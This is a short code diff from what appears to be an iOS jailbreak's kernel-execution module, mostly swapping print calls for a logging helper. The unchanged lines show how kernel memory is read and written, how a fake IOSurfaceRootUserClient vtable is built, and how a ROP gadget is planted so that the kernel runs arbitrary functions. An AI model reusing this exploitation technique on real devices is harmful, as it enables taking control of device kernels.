@@ -32,7 +32,7 @@ static mach_port_t prepare_user_client()
         LOG("unable to get user client connection");
         exit(EXIT_FAILURE);
     }
-    LOG("got user client: 0x%x", user_client);
+    util_info("got user client: 0x%x", user_client);
     return user_client;
 }
 
@@ -66,19 +66,20 @@ bool init_kexecute()
     // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
     IOSurfaceRootUserClient_port = get_address_of_port(getpid(), user_client); // UserClients are just mach_ports, so we find its address
     if (!ISADDR(IOSurfaceRootUserClient_port)) return false;
-    printf("IOSurfaceRootUserClient_addr\n");
+    util_info("IOSurfaceRootUserClient_addr");
 
     IOSurfaceRootUserClient_addr = ReadKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
     if (!ISADDR(IOSurfaceRootUserClient_addr)) return false;
 
     uint64_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
     if (!ISADDR(IOSurfaceRootUserClient_vtab)) return false;
-    printf("IOSurfaceRootUserClient_vtab\n");
+    util_info("IOSurfaceRootUserClient_vtab");
 
     // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
     // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
     
     // Create the vtable in the kernel memory, then copy the existing vtable into there
+    sched_yield();
     fake_vtable = kmem_alloc(fake_kalloc_size);
     if (!ISADDR(fake_vtable)) return false;
     
@@ -105,7 +106,7 @@ bool init_kexecute()
     // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
     WriteKernel64(fake_vtable + 8 * 0xB7, GETOFFSET(add_x0_x0_0x40_ret));
    // sched_yield();
-    printf("WriteKernel64 fake_vtable\n");
+    util_info("WriteKernel64 fake_vtable");
 
  
 #endif
